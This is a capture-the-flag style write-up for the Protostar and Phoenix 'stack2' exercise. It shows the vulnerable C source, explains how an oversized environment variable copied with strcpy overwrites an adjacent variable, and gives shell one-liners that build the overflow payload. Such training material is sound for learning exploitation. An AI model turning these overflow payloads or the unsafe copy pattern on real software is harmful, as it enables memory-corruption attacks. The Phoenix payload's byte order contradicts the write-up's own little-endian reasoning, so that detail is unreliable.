# Protostar and Phoenix -- Stack 2


## Level Description
Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  # 0x0d0a090a for Phoenix
  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```


## Solution
This was again a simple stack overflow exploit. But here instead of user-controlled input getting directly into the `buffer` array, it's first passed into a pointer. 
Since `getenv()` returns a new string allocation containg the value of the environmnt variable, it in itself doesn't introduce a vulnubility. 
The vulunibility is introduced when the returned result is copied into a fixed size array
```C
strcpy(buffer, variable)  <----- Causes the buffer to overflow and write outside allocated region
```
Since the `modified` variable is right down the `buffer` array, the overflow from `buffer` writes into `modified`. Now for the specfic value of `modified`, we already know that x86 is _Little Endian_. So reversing the value in the input will do the trick.


The command I ended up using to create the payload was <ul>
<li><code>GREENIE=`python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'"` ./stack2 for Protostar</code></li>
<li><code>ExploitEducation=`python3 -c "print('A' * 64 + '\x0d\x0a\x09\x0a')"` ./stack-two for Phoenix</code></li>
</ul>
